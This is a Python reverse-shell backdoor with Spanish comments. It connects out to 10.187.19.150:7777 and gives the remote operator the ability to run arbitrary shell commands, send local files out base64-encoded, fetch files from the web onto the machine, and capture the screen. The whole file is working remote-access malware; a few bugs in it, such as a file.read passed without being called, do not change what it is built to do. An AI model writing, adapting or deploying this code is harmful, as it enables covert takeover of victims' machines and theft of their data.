#! /usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64
import requests
import mss

def download_file(url):
     consulta = requests.get(url)
     name_file = url.split("/")[-1]
     with open(name_file,'wb') as file_get:
          file_get.write(consulta.content)

def screenshot():
     screen = mss.mss()
     screen.shot()

def shell():
     current_dir = os.getcwdb()
     cliente.send(current_dir)
     bufferSize = 30000
     while True:
          res = cliente.recv(1024)
          res_test = res.decode()
          if res == "exit":
               break
          elif res_test[:2] == "cd" and len(res_test) > 2:
               os.chdir(res[3:])
               result = os.getcwd()
               cliente.send(result.encode())
          elif res_test[:8] == "download":
               with open(res[9:],'rb') as file_download:
                    file_download_test = file_download.decode()
                    cliente.send(base64.b64encode(file_download.read()))
          # falta opcion upload
          # elif res_test[:6] == "upload":
          #      with open(res_test[7:],'wb') as file_upload:
          #           datos = cliente.recv(bufferSize)
          #           file_upload.write(base64.b64decode(datos))
          elif res_test[:3] == "get":
               try:
                    download_file(res_test[4:])
                    response = "El archivo se descargó correctamente"
                    cliente.send(response.encode())
               except:
                    response = "Error en la descarga del archivo"
                    cliente.send(response.encode())
          elif res_test[:10] == "screenshot":
               try:
                    screenshot()
                    with open('screenshot-1.png','rb') as file_send:
                         cliente.send(base64.b64encode(file_send.read))
                    # os.remove('screenshot-1.png')
               except:
                    response = "error"
                    cliente.send(response.encode())
          else:
               proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               result = proc.stdout.read() + proc.stderr.read()
               if len(result) == 0:
                    var = "1"
                    cliente.send(var.encode())
               else:
                    cliente.send(result)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(('10.187.19.150', 7777))
shell()
cliente.close()
